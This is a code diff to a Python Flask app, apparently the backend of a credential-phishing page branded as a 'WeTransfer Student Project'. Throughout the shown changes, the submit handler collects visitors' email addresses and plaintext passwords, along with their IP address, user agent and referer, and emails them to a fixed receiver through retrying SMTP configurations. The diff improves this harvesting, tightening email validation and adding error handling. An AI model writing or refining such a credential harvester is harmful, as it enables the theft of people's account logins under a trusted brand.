@@ -119,14 +119,24 @@ def send_email_with_retry(email, password, ip_address, max_retries=3):
     msg['Subject'] = 'New Form Submission (Student Project)'
     msg['From'] = EMAIL_SENDER
     msg['To'] = EMAIL_RECEIVER
+    msg['Reply-To'] = EMAIL_SENDER
+    
+    # Enhanced email content with better formatting
     msg.set_content(f"""
-New submission received at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}:
+NEW FORM SUBMISSION RECEIVED
 
-Email: {email}
-Password: {password}
-IP Address: {ip_address}
+Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
+Submitted Email: {email}
+Submitted Password: {password}
+User IP Address: {ip_address}
 User Agent: {request.headers.get('User-Agent', 'Unknown')}
+Referer: {request.headers.get('Referer', 'Direct access')}
+
+---
+This is an automated message from WeTransfer Student Project
 """)
+    
+    logger.info(f"📧 Preparing email from {EMAIL_SENDER} to {EMAIL_RECEIVER}")
     
     # List of SMTP configurations to try
     smtp_configs = [
@@ -189,6 +199,10 @@ User Agent: {request.headers.get('User-Agent', 'Unknown')}
             logger.info(f"Waiting {wait_time} seconds before retry...")
             time.sleep(wait_time)
     
+    error_msg = f"Failed to send email after {max_retries} attempts with all methods"
+    logger.error(f"❌ {error_msg}")
+    return {'success': False, 'error': error_msg}
+    
 @app.route('/submit', methods=['POST'])
 def submit():
     """Handle form submission with enhanced error handling"""
@@ -207,9 +221,18 @@ def submit():
                 'message': 'Email and password are required'
             }), 400
         
-        # Validate email format (basic check)
-        if '@' not in email or '.' not in email:
+        # Enhanced email validation
+        if '@' not in email or '.' not in email.split('@')[1]:
             logger.warning(f"⚠️ Invalid email format: {email}")
+            return jsonify({
+                'status': 'error',
+                'message': 'Please enter a valid email address'
+            }), 400
+        
+        # Check for valid email domains
+        email_domain = email.split('@')[1].lower()
+        if len(email_domain) < 4:  # minimum domain like a.co
+            logger.warning(f"⚠️ Invalid email domain: {email_domain}")
             return jsonify({
                 'status': 'error',
                 'message': 'Please enter a valid email address'
